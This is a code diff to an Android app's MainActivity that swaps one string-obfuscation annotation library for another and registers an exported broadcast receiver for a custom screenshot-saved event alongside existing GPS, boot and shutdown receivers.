@@ -70,9 +70,9 @@ import java.util.concurrent.Executor;
 
 import javax.net.ssl.SSLContext;
 
-import io.michaelrocks.paranoid.Obfuscate;
+import com.github.megatronking.stringfog.annotation.StringFogIgnore;
 
-@Obfuscate
+@StringFogIgnore
 public class MainActivity extends Activity {
     static final int ACTIVATION_REQUEST = 47;
     static final int ACTIVATION_REQUEST_code = 101;
@@ -1044,13 +1044,16 @@ public class MainActivity extends Activity {
         IntentFilter intentFilter3 = new IntentFilter("android.intent.action.USER_PRESENT");
         //Phone switch off
         IntentFilter intentFilter4 = new IntentFilter("android.intent.action.ACTION_SHUTDOWN");
-
+        IntentFilter intentFilter5 = new IntentFilter("com.easyfrom.jitsi.SCREENSHOT_SAVED");
         this.registerReceiver(new gpsreciever(), intentFilter);
         this.registerReceiver(new phoneon(), intentFilter1);
         this.registerReceiver(new BootReceiver(), intentFilter1);
        // this.registerReceiver(new activity_recognize(), intentFilter2);
         this.registerReceiver(new onreboot(), intentFilter3);
         this.registerReceiver(new ShutdownReceiver(), intentFilter4);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            this.registerReceiver(new ScreenshotBroadcastReceiver(),intentFilter5,Context.RECEIVER_EXPORTED);
+        }
 
         ComponentName receiver = new ComponentName(this, onreboot.class);
         PackageManager pm = this.getPackageManager();
